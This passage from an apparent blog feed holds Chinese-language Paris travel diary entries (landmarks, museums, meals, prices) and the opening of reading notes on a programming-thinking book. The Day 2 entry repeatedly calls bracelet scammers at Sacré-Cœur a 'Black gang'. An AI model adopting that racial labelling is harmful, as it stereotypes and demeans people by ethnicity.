&lt;p&gt;之後繼續爬樓梯登上第 2 層，&lt;br /&gt;
這次的樓梯間就沒有介紹了，&lt;br /&gt;
爬上去之後一樣是繞一圈把風景看了一遍。&lt;br /&gt;
有許多 Free Tour 在用英文介紹，&lt;br /&gt;
然後在這邊意外發現艾菲爾鐵塔會在整點的時候閃爍，&lt;br /&gt;
原本還以為是因為聖誕節的關係。  &lt;/p&gt;
&lt;p&gt;而第 2 層又再分為 2 層，有樓梯連接，&lt;br /&gt;
上層的部份有搭電梯前往第 3 層的售票口，&lt;br /&gt;
原始的圓形螺旋窄梯雖然有保存，但應該是沒開放讓人走樓梯上去，&lt;br /&gt;
因為欄杆高度其實不高，所以可能有點危險。&lt;br /&gt;
要再上去第 3 層的話，&lt;br /&gt;
18~24 的青年票價是 6 歐，&lt;br /&gt;
不過我和朋友沒上去就是了。  &lt;/p&gt;
&lt;p&gt;之後就走下樓梯回到第 1 層，&lt;br /&gt;
發現紀念品店對面有個小小的電影放映室，&lt;br /&gt;
於是進去看了一下，&lt;br /&gt;
內容一樣是艾菲爾鐵塔的一些紀錄，&lt;br /&gt;
看完之後就走下樓梯回到地面，&lt;br /&gt;
去逛附近的聖誕市集。  &lt;/p&gt;
&lt;p&gt;雖然只有一條街的長度，&lt;br /&gt;
說起來其實不大，&lt;br /&gt;
可能甚至沒有今年台北 101 旁舉辦的那個這麼大，&lt;br /&gt;
但是有著很應景的聖誕節氣氛。&lt;br /&gt;
小小的溜冰場、紀念品、五彩繽紛的馬卡龍、各式各樣的手工皂、Vin Chaud、帽子、皮革製品、毛衣、臘腸等等，&lt;br /&gt;
還有一鍋比一鍋還大的燉馬鈴薯（忘記這道菜的名字了）搭配一條又大又鹹的大香腸，&lt;br /&gt;
販賣 Cheese Sandwitch 的攤位都有著形狀特殊的刮起司機，&lt;br /&gt;
基本上除了吃的東西以外，&lt;br /&gt;
商家賣的商品的重複率不高，&lt;br /&gt;
在這邊解決晚餐後就朝著 Bir-Hakeim 站回去，&lt;br /&gt;
路上竟然有人直接兜售紅酒。  &lt;/p&gt;
&lt;p&gt;順便去看了附近那座出現在 Inception 裡面的橋，&lt;br /&gt;
橋的名字就叫 Pont de Bir-Hakeim，&lt;br /&gt;
然後走到橋的另外一頭的 Polly 站搭地鐵回 Anvers，&lt;br /&gt;
地鐵上有人抱著一瓶紅酒忍不住喝了幾口，&lt;br /&gt;
出站後也和朋友去超市買了瓶 4 歐左右的紅酒，&lt;br /&gt;
回去旅館用剛剛在聖誕市集花 2 歐元買的酒刀開來喝。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/24/33c3-暨歐洲法荷德聖誕跨年遊-5"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (5)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Paris"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (3)</title><link href="https://blog.m157q.tw/posts/2016/12/22/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-3/" rel="alternate"></link><published>2017-01-15T00:45:59+08:00</published><updated>2017-01-15T00:45:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-22:posts/2016/12/22/33c3-暨歐洲法荷德聖誕跨年遊-3/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/21/33c3-暨歐洲法荷德聖誕跨年遊-2"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (2)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 3 2016/12/22 Thu&lt;/h2&gt;
&lt;p&gt;今天是陰雨天，&lt;br /&gt;
但溫度反而沒有比昨天冷，&lt;br /&gt;
巴黎的天氣真神奇。  &lt;/p&gt;
&lt;p&gt;早餐先在旅店附近的麵包店，&lt;br /&gt;
花了 1.2 歐，&lt;br /&gt;
吃了個巧克力酥皮麵包解決。&lt;br /&gt;
巴黎麵包的酥皮真的很厲害啊，&lt;br /&gt;
在台灣好像都沒吃過這麼酥皮的，&lt;br /&gt;
看到巴黎人是拿牛角麵包沾著 Espreeso 吃的。&lt;br /&gt;
&lt;img alt="Cafe de Paris" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/cafe.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後朋友說想去萬神殿附近的居禮博物館參觀，&lt;br /&gt;
但搭地鐵完再走過去之後發現下午一點才開放，&lt;br /&gt;
於是先去萬神殿。&lt;br /&gt;
&lt;img alt="musee curie" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/musee-curie.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;沿途的風景真的是令人賞心悅目，&lt;br /&gt;
真的只有處處皆風景能夠形容。&lt;br /&gt;
在路上經過了 Fanprix，&lt;br /&gt;
進去閒晃了一下，&lt;br /&gt;
這邊的超市基本上都會有台榨汁機，&lt;br /&gt;
可以直接購買新鮮的果汁，&lt;br /&gt;
連賣堅果都有個堅果機，&lt;br /&gt;
然後紅酒真的是很便宜，&lt;br /&gt;
最便宜的不到三塊歐元，&lt;br /&gt;
價錢大概就跟瓶裝水差不多，&lt;br /&gt;
這也是為什麼在這裡三不五時就喝個紅酒是個稀鬆平常的事。&lt;br /&gt;
&lt;img alt="orange machine" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/orange-machine.jpg" /&gt;&lt;br /&gt;
&lt;img alt="nuts machine" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/nuts-machine.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;逛完之後就前往萬神殿，&lt;br /&gt;
萬神殿前有好幾棵應景的聖誕樹，&lt;br /&gt;
從門口看出去可以看到在雲霧中的巴黎鐵塔，&lt;br /&gt;
萬神殿的莊嚴雄偉與美更是不用說了。&lt;br /&gt;
朋友想進去參觀，但我對室內行程沒有很有興趣，&lt;br /&gt;
所以就一個人在附近閒晃。&lt;br /&gt;
&lt;img alt="Panthéon" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/Panthéon.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;附近有一間很漂亮的法蘭西公學院（Collège de France）、&lt;br /&gt;
巴黎大學（Université de Paris）的其中一所、&lt;br /&gt;
還有一間我忘了名字的公立圖書館（只記得圖書館門前非常多人在抽煙）。&lt;br /&gt;
&lt;img alt="College de France" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/college-de-france.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;這邊其實是個小坡地，&lt;br /&gt;
往萬神殿的方向都是上坡。&lt;br /&gt;
然後這附近給電動車的充電車位特別多。&lt;br /&gt;
&lt;img alt="car charger" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/car-charger.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後在附近的小巷弄尋找午餐，&lt;br /&gt;
後來找到這間 Mechwi (45 Rue Descartes, 75005 Paris, France)，&lt;br /&gt;
我點了個 7 歐的 Falafel （附薯條和飲料），&lt;br /&gt;
飲料選 Perrier 的氣泡水，&lt;br /&gt;
第一次喝氣泡水，&lt;br /&gt;
覺得好難喝啊，&lt;br /&gt;
可能是因為我本來就不喜歡氣泡飲料吧，&lt;br /&gt;
但 Falafel 真的挺好吃的。&lt;br /&gt;
&lt;img alt="Falafel" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/falafel.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;吃完後又回去居裡博物館，&lt;br /&gt;
結果疑似是因為聖誕假期而關閉，&lt;br /&gt;
朋友說想去警察博物館參觀。  &lt;/p&gt;
&lt;p&gt;到了之後發現是個戒備森嚴的警察局，&lt;br /&gt;
有鐵欄杆當拒馬，&lt;br /&gt;
入口處還有荷槍實彈的警察和安檢門，&lt;br /&gt;
我還在懷疑真的有警察博物館嗎？&lt;br /&gt;
不過建築外面有個布條寫著 musée，&lt;br /&gt;
大概花了快十分鐘通過嚴格的安檢後，&lt;br /&gt;
才進去參觀。&lt;br /&gt;
&lt;img alt="Police Museum" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/musee-de-police.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;櫃台的接待人員是個胖胖的、很親切的法國女人，&lt;br /&gt;
講著一口濃濃法語腔的英文，&lt;br /&gt;
雖然沒有完全聽懂，&lt;br /&gt;
不過可以清楚得感受到她的熱情，&lt;br /&gt;
跟這幾天遇到的法國人不太一樣 XD&lt;br /&gt;
之後就是參觀些歷年以來法國的警察制服、使用的配備、刑具還有一些罪大惡極的罪犯的事蹟。  &lt;/p&gt;
&lt;p&gt;結束後想說去盧森堡公園（Jardin du Luxembourg）看看，&lt;br /&gt;
結果又是因為聖誕假期的關係，&lt;br /&gt;
12/16~31 的開放時間只有 8:15 ~ 16:30，&lt;br /&gt;
除了我們以外也有很多人撲空。&lt;br /&gt;
於是想說去看看拉法葉百貨。  &lt;/p&gt;
&lt;p&gt;到了拉法葉百貨以後，&lt;br /&gt;
進去每個入口基本上都有安全人員擺張桌椅坐在那，&lt;br /&gt;
有些要檢查背包、有些用金屬探測器、有些不用，&lt;br /&gt;
但因為我們沒打算買啥東西，&lt;br /&gt;
所以進去稍微逛了一下就出來尋找晚餐了。  &lt;/p&gt;
&lt;p&gt;晚餐吃的是間不怎麼樣的餐廳，&lt;br /&gt;
所以我也懶的再查地址了，&lt;br /&gt;
是個印度人開的，&lt;br /&gt;
一直在講手機。&lt;br /&gt;
兩塊披薩一罐可樂，7.9 歐。  &lt;/p&gt;
&lt;p&gt;吃完晚餐吃後，&lt;br /&gt;
搭地鐵去參觀巴黎工藝博物館（Musée des Arts et Métiers），&lt;br /&gt;
Arts et Métiers 站出來就到了，&lt;br /&gt;
（但附近有不少隨地大小便的人XD）&lt;br /&gt;
星期四晚上特別開放到 21:30，&lt;br /&gt;
不然平常只開放到 18:00。&lt;br /&gt;
裏面有非常多的介紹，&lt;br /&gt;
喜歡理工的人值得去看一下，&lt;br /&gt;
很多都是以前在課本上才看得到的物品。&lt;br /&gt;
&lt;img alt="Musée des Arts et Métiers" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/Musée-des-Arts-et-Métiers.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;參觀展覽是免費的，&lt;br /&gt;
有語音導覽可以租借。&lt;br /&gt;
展區非常大，&lt;br /&gt;
從二樓一路逛下來，&lt;br /&gt;
真的要認真看的話我覺得得花一整個下午，&lt;br /&gt;
因為介紹的東西真的太多了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/23/33c3-暨歐洲法荷德聖誕跨年遊-4"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (4)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Paris"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (2)</title><link href="https://blog.m157q.tw/posts/2016/12/21/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-2/" rel="alternate"></link><published>2017-01-24T01:39:59+08:00</published><updated>2017-01-24T01:39:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-21:posts/2016/12/21/33c3-暨歐洲法荷德聖誕跨年遊-2/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/20/33c3-暨歐洲法荷德聖誕跨年遊-1"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (1)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 2 2016/12/21 Wed&lt;/h2&gt;
&lt;p&gt;不懂為什麼中國國航的飛機上不能讓有飛航模式的手機開機，卻可以打開電腦。&lt;br /&gt;
然後椅背上寫著 3000M 以上的高空會開啟 WiFi 也是騙人的，&lt;br /&gt;
幸好，敲敲鍵盤紀錄些事情是不用連網路的，&lt;br /&gt;
也沒被禁止使用電腦。&lt;br /&gt;
&lt;img alt="3000 meters wifi" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/3000-meters-wifi.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後要講件事，&lt;br /&gt;
說明一下這飛機誤點了以後有多麼的倉促。&lt;br /&gt;
我一坐到位置上以後，&lt;br /&gt;
發覺屁股怎麼有點刺刺的，&lt;br /&gt;
結果伸手去摸竟然摸到了鬼針草！&lt;br /&gt;
我的座位上竟然有鬼針草！&lt;br /&gt;
&lt;img alt="Bidens alba on my flight seat" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/bidens-alba-on-my-flight-seat.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;十一小時的飛行就在吃飽睡、睡飽吃，&lt;br /&gt;
還有遇到了不知道多少次的小亂流後，&lt;br /&gt;
終於到巴黎戴高樂機場了。  &lt;/p&gt;
&lt;p&gt;一出飛機就體驗到打開冰箱冷藏庫一樣的溫度，&lt;br /&gt;
拿了行李之後，&lt;br /&gt;
站上很軟 Q 像是貨物運輸帶的電扶梯之後，&lt;br /&gt;
搭機場捷運從第二航廈搭到第三航廈，&lt;br /&gt;
再刷卡花 10 歐搭 RER 到超級漂亮的巴黎北站。&lt;br /&gt;
&lt;img alt="Gare du Nord" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/gare-du-nord.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後前往入住的旅館 Le Regent Hostel 先寄放行李，&lt;br /&gt;
店員拿了挺有用的巴黎地圖和地鐵的小導覽給我們，&lt;br /&gt;
大小剛好可以放在口袋內，&lt;br /&gt;
拿出來看其實挺方便的。&lt;br /&gt;
之後和朋友決定先前往附近有名的聖心堂(Sacré-Cœur)，&lt;br /&gt;
因為旅館就在 Anvers 站附近，&lt;br /&gt;
（Anvers 的發音如果用英文來拼的話其實比較接近 envear）&lt;br /&gt;
所以離 Sacré-Cœur 非常近，&lt;br /&gt;
走路大概 5 分鐘就到了。&lt;br /&gt;
&lt;img alt="Sacré-Cœur" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/Sacré-Cœur.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;遊客非常多，&lt;br /&gt;
入口有販賣紀念品的小屋和旋轉木馬，&lt;br /&gt;
聖心堂就坐落在蒙馬特(Montmartre)高地上，&lt;br /&gt;
非常的莊嚴雄偉，&lt;br /&gt;
必須得爬坡才能到達。  &lt;/p&gt;
&lt;p&gt;在這裡就要好好紀錄一下幸運手環黑人幫：  &lt;/p&gt;
&lt;p&gt;先講結論： 「&lt;br /&gt;
請從面對聖心堂左側的纜車搭乘處，&lt;br /&gt;
旁邊有條長長的階梯那邊走上聖心堂，&lt;br /&gt;
理論上不會遇到黑人幫，&lt;br /&gt;
而且長長的樓梯滿適合拍照的。&lt;br /&gt;
」&lt;br /&gt;
（更上面的平台會有警察巡邏，所以黑人幫到那裡會被警察趕走，&lt;br /&gt;
我就親眼見到一位幸運手環黑人正在搔擾兩位韓國女遊客的時候被警察阻止。&lt;br /&gt;
但纜車搭乘處的樓梯並沒有警察巡邏，所以為何沒有黑人幫我也不是很清楚。&lt;br /&gt;
我是下來的時候為了避開他們才發現樓梯的，要上去的時候不知道，所以就跟他們正面對上了...）  &lt;/p&gt;
&lt;p&gt;聖心堂入口處左右兩側的上坡，&lt;br /&gt;
會有強制帶你幸運手環然後再藉故跟你索取手環費用的黑人幫，&lt;br /&gt;
專門挑外國遊客下手，&lt;br /&gt;
會告訴你說這個是為了要參觀聖心堂而戴，&lt;br /&gt;
我和朋友一開始從左邊上去，&lt;br /&gt;
遇到以後想說從右邊，&lt;br /&gt;
結果他們是兩邊各站成一排人牆擋人，&lt;br /&gt;
結果我就兩手死插著口袋走過去，&lt;br /&gt;
被其中一個很用力的拉住我的外套，&lt;br /&gt;
一直跟我說「For church! It's for church!」&lt;br /&gt;
我就更用力的往前走，&lt;br /&gt;
才把他扯開，真的很誇張。&lt;br /&gt;
即便過了他們的人牆，&lt;br /&gt;
到達可以拍照的平台，&lt;br /&gt;
黑人幫還是會有一些單獨的游擊部隊，&lt;br /&gt;
有可能趁你在拍照或不注意的時候靠近你，&lt;br /&gt;
所以如果覺得沒有在那個位置拍照沒關係的話，&lt;br /&gt;
就從面對聖心堂左側的纜車搭乘處的樓梯走上去吧。  &lt;/p&gt;
&lt;p&gt;爬上聖心堂前面後，&lt;br /&gt;
可以鳥瞰整個巴黎市，&lt;br /&gt;
非常壯觀，&lt;br /&gt;
可以看到遠方的巴黎鐵塔，&lt;br /&gt;
天空常常會有許多交錯的飛機雲，&lt;br /&gt;
這裡的樓梯平台也常常會有街頭藝人在此表演，&lt;br /&gt;
我遇到的是一位談著豎琴的老人。&lt;br /&gt;
&lt;img alt="Paris Overlook" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/paris-overlook.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;聖心堂裏面是可以參觀的，&lt;br /&gt;
但禁止喧鬧和攝影（其實攝影我不確定，因為我沒看到有告示明確禁止，但沒看到有人拍照我也就沒拍了，但彩色琉璃窗真的頗漂亮），&lt;br /&gt;
就是個莊嚴的宗教場所這樣，&lt;br /&gt;
要進去地下墓穴或頂樓參觀的話要收費，&lt;br /&gt;
我就沒進去了。  &lt;/p&gt;
&lt;p&gt;再往面對聖心堂的左前方走，&lt;br /&gt;
有條小小的商店街，&lt;br /&gt;
周圍會有很多牛仔裝扮、抽著煙、拿著畫板的人，&lt;br /&gt;
看到你就會直接過來對著你在畫板上開始素描你的畫像，&lt;br /&gt;
畫完的話會把畫送你然後跟你收取小費，&lt;br /&gt;
所以不想付錢的話就跟他拒絕然後加快腳步走開就行了，&lt;br /&gt;
這個沒有黑人幫那麼恐怖，&lt;br /&gt;
雖然人也不少就是。&lt;br /&gt;
我是想說第一次遇到，&lt;br /&gt;
所以就沒有拒絕，&lt;br /&gt;
他就邊抽煙邊跟你用英文有一搭沒一搭的聊天，&lt;br /&gt;
問你哪裡來的，叫什麼名字，跟你說他的名字之類的，&lt;br /&gt;
感覺就沒有很認真在畫就是了，&lt;br /&gt;
大概 5~10 分鐘會畫完，&lt;br /&gt;
然後會在紙上簽名，&lt;br /&gt;
捲起來後拿給你，&lt;br /&gt;
跟你收取小費，&lt;br /&gt;
錢拿太少他還會叫你拿多一點，&lt;br /&gt;
我遇到這個是拿 5 歐給他，&lt;br /&gt;
他還一直說「If you give me 20, it would be better.」&lt;br /&gt;
反正就趕快拒絕就是了，&lt;br /&gt;
主要是我覺得他畫的真的很醜 = =，&lt;br /&gt;
之後就稍微看了一下，&lt;br /&gt;
發現有些很多都是大人帶著小孩子，&lt;br /&gt;
然後讓小孩子被畫，&lt;br /&gt;
就是圖個有趣吧，&lt;br /&gt;
還是有看到畫的還不錯的，&lt;br /&gt;
看來也很吃運氣，&lt;br /&gt;
只能說我跟朋友的運氣不好吧。  &lt;/p&gt;
&lt;p&gt;之後就去附近找午餐吃，&lt;br /&gt;
吃了一間柬埔寨料理 Le Cambodge (20 Rue Yvonne le Tac, 75018 Paris, France)，&lt;br /&gt;
（同行的朋友一直在法國找亞洲料理吃，說是比較便宜。的確是比較便宜啦，但就很奇怪啊。囧）&lt;br /&gt;
點了個 Grilled Pork chop rice，價格 9.9 歐，&lt;br /&gt;
但來的時候發現其實大概就是叉燒飯，&lt;br /&gt;
上面灑些蔥、香菜，&lt;br /&gt;
但份量還挺多的，而且不難吃，&lt;br /&gt;
只是來歐洲真的會覺得東西都頗貴就是了。  &lt;/p&gt;
&lt;p&gt;吃完之後朋友一直說要找 Free Tour 參加，&lt;br /&gt;
因為他手機沒有買網路，&lt;br /&gt;
所以我花時間查了一下子，&lt;br /&gt;
找到一個在 Saint-Sébastien - Froissart 附近的，&lt;br /&gt;
約在 Merci 前面，&lt;br /&gt;
但時間到了卻沒人，&lt;br /&gt;
所以索性進去 Merci 逛了一下，&lt;br /&gt;
裏面給我的感覺就是巴黎的高級無印良品，&lt;br /&gt;
賣很多生活用品。&lt;br /&gt;
很多亞洲女生都在裏面逛 XD  &lt;/p&gt;
&lt;p&gt;之後就沿路走到巴士底監獄那邊，&lt;br /&gt;
沿途觀察店家賣什麼東西，&lt;br /&gt;
真的是應有盡有，&lt;br /&gt;
賣機車的店最多，&lt;br /&gt;
相機的店也不少，&lt;br /&gt;
還有看到專門賣電子煙的店。&lt;br /&gt;
巴士底監獄那邊有個高高的紀念柱，&lt;br /&gt;
旁邊有個很不搭的遊樂設施。  &lt;/p&gt;
&lt;p&gt;之後朋友說想參觀雨果故居，&lt;br /&gt;
走到那邊後發現正中央有個很漂亮的公園，&lt;br /&gt;
叫作孚日廣場 (Place des Vosges)，&lt;br /&gt;
是巴黎最古老的廣場，&lt;br /&gt;
由亨利四世於 1605 年到 1612 年下令興建的。&lt;br /&gt;
&lt;img alt="Place des Vosges" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/place-des-vosges.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;還看到兩個騎警在廣場旁邊巡邏呢。&lt;br /&gt;
&lt;img alt="Mounties" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/mounties.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後就到雨果故居參觀，&lt;br /&gt;
參觀前得先過安檢門，&lt;br /&gt;
並把包包打開來讓安全人員檢查，&lt;br /&gt;
安檢門挺嚴格的，&lt;br /&gt;
我把身上所有東西都拿出來了安檢門還是會響，&lt;br /&gt;
最後安全人員也看不下去，直接跟我說沒關係可以進去了。&lt;br /&gt;
參觀費用 26 歲以下是 6 歐元，&lt;br /&gt;
裡面的內容全部都是法文，&lt;br /&gt;
語音導覽的話要 5 歐元，&lt;br /&gt;
有兩個 3.5mm 接頭，&lt;br /&gt;
所以最多可以同時 4 個人每人一支耳機，&lt;br /&gt;
但耳機應該是要自備，&lt;br /&gt;
看到很多人沒戴耳機，&lt;br /&gt;
所以把導覽機直接貼在耳朵旁聽，&lt;br /&gt;
真的想要瞭解且不懂法文的人建議租個導覽，&lt;br /&gt;
我是因為沒有太大的興趣，&lt;br /&gt;
所以就直接看展示物這樣，&lt;br /&gt;
主要就是雨果的一些畫作、收藏和手稿，&lt;br /&gt;
裏面同時還有其他不是雨果的展覽。&lt;br /&gt;
故居內部的裝潢真的很漂亮，&lt;br /&gt;
然後廁所在頂樓 XD&lt;br /&gt;
&lt;img alt="Victor Hugo" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/victor-hugo.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後前往塞納河畔右岸散步，&lt;br /&gt;
襯著燈光，真的很漂亮，&lt;br /&gt;
還有炫炮燈光的遊河船，&lt;br /&gt;
將樹影斜映在岸旁的建築上，&lt;br /&gt;
置身電影的感覺油然而生。&lt;br /&gt;
&lt;img alt="Seine" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/seine.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;塞納河旁是沒有欄杆的，&lt;br /&gt;
所以人是可以被直接推下去的，&lt;br /&gt;
應該是裝了欄杆會與這個城市的美相違背吧？&lt;br /&gt;
記得走路要小心就是，&lt;br /&gt;
不只是怕掉進河裡，&lt;br /&gt;
因為地上有可能會有狗大便 XD&lt;br /&gt;
（巴黎人真的遛狗都讓狗隨地大便的，很多地方都有狗大便，總是被行人踩的一塌糊塗的。）&lt;br /&gt;
&lt;img alt="Seine Dog Shit" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/seine-dog-shit.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後走路前往巴黎的聖母院還有旁邊的禮拜堂，&lt;br /&gt;
聖母院的前面有個很大的廣場，&lt;br /&gt;
遊客非常多，&lt;br /&gt;
因為恐怖攻擊的問題，&lt;br /&gt;
所以有荷槍實彈的警察和軍隊駐守巡邏。&lt;br /&gt;
小時候看的迪士尼電影《鐘樓怪人》的畫面浮現眼前，&lt;br /&gt;
配著鐘聲，再加上燈光輝映且莊嚴的聖母院，&lt;br /&gt;
彷彿見到加西莫多的身影。&lt;br /&gt;
&lt;img alt="Notre-Dame de Paris" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/notre-dame-de-paris.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後在附近的小巷弄間尋找晚餐，&lt;br /&gt;
找到一間還不錯的餐廳 Maison Blanche&lt;br /&gt;
(21 Rue de la Huchette, 75005 Paris, France)&lt;br /&gt;
10 歐就可以吃到完整的前菜、主餐、甜點，&lt;br /&gt;
法國麵包用來沾著醬汁吃。&lt;br /&gt;
也有 15 歐以上的菜單就是。&lt;br /&gt;
我點了起司培根蛋、紅酒燉牛肉、水果沙拉，&lt;br /&gt;
真的滿好吃的，&lt;br /&gt;
不過最不習慣的應該就是上菜速度非常慢，&lt;br /&gt;
所以吃飯時間拖的非常的長。&lt;br /&gt;
&lt;img alt="Boeuf Bourguignon" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/boeuf-bourguignon.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;覆蓋一張旅館窗外非常巴黎的陽台照結束今天，&lt;br /&gt;
之後紀錄就會是 GMT+1 的時間啦！&lt;br /&gt;
&lt;img alt="Balcony" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/balcony.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/22/33c3-暨歐洲法荷德聖誕跨年遊-3"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (3)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Paris"></category></entry><entry><title>《程序員思維修煉》</title><link href="https://blog.m157q.tw/posts/2016/12/21/pragmatic-thinking-and-learning-refactor-your-wetware/" rel="alternate"></link><published>2016-12-21T02:08:33+08:00</published><updated>2016-12-21T02:08:33+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-21:posts/2016/12/21/pragmatic-thinking-and-learning-refactor-your-wetware/</id><summary type="html">&lt;p&gt;&lt;img alt="front cover" src="/files/pragmatic-thinking-and-learning-refactor-your-wetware/front-cover.jpg" /&gt;&lt;br /&gt;
&lt;img alt="back cover" src="/files/pragmatic-thinking-and-learning-refactor-your-wetware/back-cover.jpg" /&gt;  &lt;/p&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;這本一直以來都聽到或看到很多人推薦閱讀，&lt;br /&gt;
所以我就買了簡中翻譯本來看，&lt;br /&gt;
的確是從書中得知頗多對於思考這方面的看法。  &lt;/p&gt;
&lt;p&gt;然後又是一貫的拖延症，&lt;br /&gt;
11/13 的時候就讀完了，&lt;br /&gt;
但拖了一個月才寫這篇。  &lt;/p&gt;
&lt;p&gt;然後現在是在中國成都機場轉機前往巴黎的途中寫完這篇文章的 XD&lt;br /&gt;
原本班機應該要在凌晨一點四十分起飛的，&lt;br /&gt;
但因為飛機晚到延誤了一個小時，&lt;br /&gt;
所以現在凌晨兩點八分了，&lt;br /&gt;
人還在成都機場等飛機。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Notes&lt;/h2&gt;
&lt;h3&gt;從新手到專家的歷程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;德雷福斯 (Dreyfus) 模型  &lt;ul&gt;
&lt;li&gt;新手 (Novices)  &lt;ul&gt;
&lt;li&gt;新手需要指令清單。 (Novinces need recipes.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;高級新手 (Advanced beginners)  &lt;ul&gt;
&lt;li&gt;高級新手不想要全局思維。 (Advanced beginners don't want the big picture.)  &lt;/li&gt;
&lt;li&gt;大多數人都是高級新手  &lt;ul&gt;
&lt;li&gt;這種現象的證據比比皆是，從 Copy-Paste Programming 的興起（把 Google 作為 IDE 的一部份），到設計模式的普遍誤用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;勝任者 (Competents)  &lt;ul&gt;
&lt;li&gt;勝任者能夠解決問題。(Competents can troubleshoot.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;精通者 (Proficient)  &lt;ul&gt;
&lt;li&gt;精通者能夠自我糾正。(Proficient practitioners can self-correct.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;專家  &lt;ul&gt;
&lt;li&gt;專家憑直覺工作。 (Experts work from intuition.)  &lt;/li&gt;
&lt;li&gt;Rules ruin experts.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;不知道自己不知道&lt;/h3&gt;
&lt;p&gt;當你在某個領域不是很擅長時，你更可能認為自己是這方面的專家。  &lt;/p&gt;
&lt;h3&gt;十年成就專家？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;4 個條件  &lt;ul&gt;
&lt;li&gt;需要一個明確定義的任務  &lt;/li&gt;
&lt;li&gt;任務需要有適當難度（有挑戰性但可行）  &lt;/li&gt;
&lt;li&gt;任務環境可以提供大量回饋，以便於你採取行動。  &lt;/li&gt;
&lt;li&gt;提供重覆犯錯和糾正錯誤的機會  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;沒有實踐就沒有技能&lt;/h3&gt;
&lt;p&gt;模仿、吸收、創新  &lt;/p&gt;
&lt;h3&gt;一種規格並非處處適用&lt;/h3&gt;
